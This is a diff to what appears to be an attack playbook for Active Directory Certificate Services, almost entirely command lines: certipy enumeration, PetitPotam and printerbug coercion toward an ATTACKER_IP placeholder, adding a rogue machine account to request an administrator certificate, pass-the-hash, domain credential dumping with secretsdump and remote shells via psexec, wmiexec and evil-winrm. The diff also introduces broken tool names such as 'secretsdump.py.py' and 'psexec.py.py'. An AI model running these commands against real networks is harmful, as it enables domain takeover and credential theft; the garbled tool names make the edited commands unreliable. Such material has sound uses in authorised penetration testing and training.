@@ -9,7 +9,7 @@ allowed-tools: Read
 
 ## Enumerate first — always
 ```bash
-netexec ldap {IP} -u '{USER}' -p '{PASS}' -M adcs             # CA presence
+nxc ldap {IP} -u '{USER}' -p '{PASS}' -M adcs             # CA presence
 certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -vulnerable -stdout
 certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -stdout   # all templates
 rusthound-ce -d {DOMAIN} -u '{USER}' -p '{PASS}' --dc-ip {IP} --zip  # BloodHound ADCS nodes
@@ -109,7 +109,7 @@ python3 printerbug.py {DOMAIN}/{USER}:'{PASS}'@{DC_FQDN} {ATTACKER_IP}
 # Or PetitPotam (no creds needed):
 python3 PetitPotam.py {ATTACKER_IP} {DC_IP}
 certipy auth -pfx {DC}.pfx -dc-ip {IP}
-secretsdump.py -k -no-pass {DOMAIN}/{DC}$@{IP}
+secretsdump.py.py -k -no-pass {DOMAIN}/{DC}$@{IP}
 ```
 
 ## ESC9 — No security extension + GenericWrite
@@ -188,7 +188,7 @@ certipy auth -pfx administrator.pfx -domain {DOMAIN} -dc-ip {IP}
 ## ESC1 via machine account (Authority / Retro pattern)
 When template requires machine account enrollment:
 ```bash
-addcomputer.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'FAKE$' -computer-pass 'FakePass123!' -dc-ip {IP}
+addcomputer.py.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'FAKE$' -computer-pass 'FakePass123!' -dc-ip {IP}
 certipy req -u 'FAKE$@{DOMAIN}' -p 'FakePass123!' -ca '{CA}' -template '{TPL}' -upn administrator@{DOMAIN} -dc-ip {IP}
 certipy auth -pfx administrator.pfx -dc-ip {IP}
 ```
@@ -197,13 +197,13 @@ certipy auth -pfx administrator.pfx -dc-ip {IP}
 ```bash
 # Pass-the-Hash (most common)
 evil-winrm -i {IP} -u administrator -H {NT_HASH}
-netexec smb {IP} -u administrator -H {NT_HASH}
-secretsdump.py {DOMAIN}/administrator@{IP} -hashes :{NT_HASH} -just-dc
+nxc smb {IP} -u administrator -H {NT_HASH}
+secretsdump.py.py {DOMAIN}/administrator@{IP} -hashes :{NT_HASH} -just-dc
 
 # Pass-the-Ticket
 export KRB5CCNAME=administrator.ccache
-psexec.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
-wmiexec.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
+psexec.py.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
+wmiexec.py.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
 
 # LDAP shell (when LDAP signing enforced, NTLM blocked)
 certipy auth -pfx administrator.pfx -dc-ip {IP} -ldap-shell
